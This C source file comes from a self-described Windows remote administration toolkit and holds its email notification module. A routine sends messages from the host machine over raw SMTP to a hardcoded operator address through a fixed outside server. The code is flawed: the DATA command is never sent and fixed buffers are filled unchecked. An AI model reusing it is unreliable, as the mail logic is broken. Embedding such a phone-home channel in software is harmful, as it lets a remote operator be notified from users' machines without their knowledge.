/* * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * 
 *   Owl Zwei - Remote Administration Toolkit For Windows                    *
 *                                                                           * 
 *   Copyright 2010 Yati Sagade                                              *
 *                                                                           *
 *   This file is part of Owl Zwei.                                          *
 *                                                                           *
 *   Owl Zwei is free software: you can redistribute it and/or modify        *
 *   it under the terms of the GNU General Public License as published by    *
 *   the Free Software Foundation, either version 3 of the License, or       *
 *   (at your option) any later version.                                     *
 *                                                                           *
 *   Owl Zwei is distributed in the hope that it will be useful,             *
 *   but WITHOUT ANY WARRANTY; without even the implied warranty of          *
 *   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the           *
 *   GNU General Public License for more details.                            *
 *                                                                           *
 *   You should have received a copy of the GNU General Public License       *
 *   along with Owl Zwei.  If not, see <http://www.gnu.org/licenses/>.       *
 *                                                                           *
 * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * */
#include "email.h"

char *owl_mail_server = "shell.tor.hu";
char *owl_cli_addr = "owl@localhost";
char *owl_mail_server_user = "yati";
char *owl_mail_host = "plox";

int SendMail( MailBall *mail ){
	
	MB("SendMail called");

	char buffer[4096];

	wsprintf(buffer, "these are the args:\nserv: %s\nfrom:%s\nto:%s\nbody:%s\n", mail->server, mail->from, mail->to, mail->body );
	MB(buffer);

	SOCKET s = connect_to( mail->server , 25 );
	MB("connected");
	if( s == SOCKET_ERROR ){
		MB("socket error");
		return -1;
	}
	unsigned long n;
	n=Recv( s , buffer , MAX_BUF_LEN );
	buffer[n] = 0;
	MB(buffer);
	
	SendLn(s,"helo localhost\n\0");
	n = Recv( s, buffer, MAX_BUF_LEN );
	buffer[n] = 0;
	MB(buffer);

	wsprintf( buffer, "MAIL FROM: <%s>\n\0", mail->from );
	
	SendLn( s, buffer );
	n = Recv( s, buffer, MAX_BUF_LEN );
	buffer[n] = 0;
	MB(buffer);
	wsprintf( buffer, "RCPT TO: <%s>\n\0", mail->to );

	SendLn( s, buffer );
	n = Recv( s, buffer, MAX_BUF_LEN );
	buffer[n] = 0;
	MB(buffer);

	wsprintf( buffer, "DATA\n\0" );

	n = Recv( s, buffer, MAX_BUF_LEN );
	buffer[n] = 0;
	MB(buffer);

	wsprintf(buffer,"%s\n\0",mail->body );

	SendLn( s, buffer );

	SendLn( s, ".\n\0" );

	n = Recv( s, buffer, MAX_BUF_LEN );
	buffer[n] = 0;
	MB(buffer);

	SendLn( s, "QUIT" );

	n = Recv( s, buffer, MAX_BUF_LEN );
	buffer[n] = 0;
	MB(buffer);

	closesocket(s);

	return 0;
}

int OwlDefaultNotify( const char *msg ){
	MailBall mail;
	MB("ODNfy called");
	wsprintf(mail.to,"%s@%s", owl_mail_server_user, owl_mail_host);
	strcpy( mail.from, owl_cli_addr );
	strcpy( mail.server , owl_mail_server );
	strncpy( mail.body , msg , MAX_BUF_LEN*2 - 1 );

	return SendMail( &mail );
}
	
